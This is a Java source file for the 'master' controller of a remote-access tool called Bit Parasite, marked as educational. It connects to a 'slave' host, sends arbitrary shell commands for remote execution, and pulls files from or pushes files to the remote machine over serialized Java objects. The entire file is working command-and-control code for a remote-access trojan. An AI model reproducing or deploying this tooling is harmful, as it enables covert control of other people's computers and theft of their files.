package com.adi.bitparasite.client;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Scanner;

import com.adi.bitparasite.mode.BitParasiteMode;
import com.adi.bitparasite.agent.BitParasiteAgent;

/**
 * The Master program will control Slave through Agent.
 * This will set the Mode of operation/s to be performed on the Slave
 * and the Agent will notify it with necessary details.
 *
 * Disclaimer: FOR EDUCATIONAL PURPOSE ONLY!
 *
 * @author Aditya R.Singh
 * @date 25/08/2016
 * @email adipratapsingh.aps@gmail.com
 */
public class BitParasiteMaster {

	private static final String BIT_PARASITE_SIGNATURE = "bitpar";
	private static final String BIT_PARASITE_READ      = "read";
	private static final String BIT_PARASITE_WRITE     = "write";
	private static final String BIT_PARASITE_EXIT      = "exit";
	
	public static void main(String[] args) {
		// IP address and the port number to connect to
		String ip = args[0];
		int port  = Integer.parseInt(args[1]);
		 
		Scanner sc = new Scanner(System.in); // To keep reading commands from the terminal
		
		/* This loop will keep running forever
		   as the Master is never expected to stop but make connections again and
		   again with Slave */
		while(true) {
			try {
				// To establish connection with the Slave
				Socket socket = new Socket(ip, port); 
				System.out.println("Socket connected to "+ip+":"+port);
				
				// Reading the command to be executed		
				String command = sc.nextLine().trim();
				
				// If not a Bit-Parasite command
				if(!isBitParasite(command))
					System.out.println(execNonBitParasiteCommandOnSlave(command, socket)); 
				else {
					// If it is a Bit-Parasite command
					String action = command.split(" ")[1]; // The Bit-Parasite operation to be performed
					
					if(action.equals(BIT_PARASITE_EXIT))
						break;
					else if(action.equals(BIT_PARASITE_READ))
						readFileFromSlave(command, socket);
					else if(action.equals(BIT_PARASITE_WRITE))
						writeFileToSlave(command, socket);
					else
						System.err.println("Please enter a valid command!");
				}
				socket.close();
			} catch(Exception e) {e.printStackTrace();}	
		}
		sc.close();
		System.out.println("Thankyou for using Bit Parasite!");
	}
	
	
	// To check if a Bit Parasite command is requested.
	private static boolean isBitParasite(String command) {
		return command.startsWith(BIT_PARASITE_SIGNATURE);
	}
	
	
	// To execute Non-Bit Parasite commands on the Slave
	private static String execNonBitParasiteCommandOnSlave(String command, Socket socket) throws Exception {
		BitParasiteAgent bpa = new BitParasiteAgent();
		bpa.setMode(BitParasiteMode.NON_BIT_PARASITE_MODE);
		bpa.setCommand(command); // Setting the command to be executed on the Slave
		
		// Sending the object to Slave
		ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
		oos.writeObject(bpa);
		oos.flush();
		
		// Receiving the object back with the data
		ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
		bpa = (BitParasiteAgent) ois.readObject();
		
		return bpa.getOutput(); // Returning the output
	}
	
	
	// Will read file from Slave and get it back
	private static void readFileFromSlave(String command, Socket socket) throws Exception {
		BitParasiteAgent bpa = new BitParasiteAgent();
		bpa.setMode(BitParasiteMode.BIT_PARASITE_READ_FILE_MODE);
		bpa.setTargetFilePath(command.split(" ")[2]); // The file to be targeted on Slave
		
		// Sending the object to Slave
		ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
		oos.writeObject(bpa);
		oos.flush();
		
		// Receiving the object back with the data
		ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
		bpa = (BitParasiteAgent) ois.readObject();
		
		bpa.setTargetFilePath(command.split(" ")[3]); // The destination where the file is to be written on Master
		bpa.writeFile();
	}
	
	
	// Will write the file on the Slave
	private static void writeFileToSlave(String command, Socket socket) throws Exception {
		BitParasiteAgent bpa = new BitParasiteAgent();
		bpa.setMode(BitParasiteMode.BIT_PARASITE_WRITE_FILE_MODE);
		bpa.setTargetFilePath(command.split(" ")[2]); // The file to be read from Master
		bpa.readFile();
		
		// Sending the object to the Slave
		bpa.setTargetFilePath(command.split(" ")[3]); // Destination file on Slave
		ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
		oos.writeObject(bpa);
		oos.flush();
		
		// Receiving the object back after performing write operation on Master
		// Do nothing with the object received. Just a part of the BitParasite protocol.
		ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
		bpa = (BitParasiteAgent) ois.readObject();
	}
}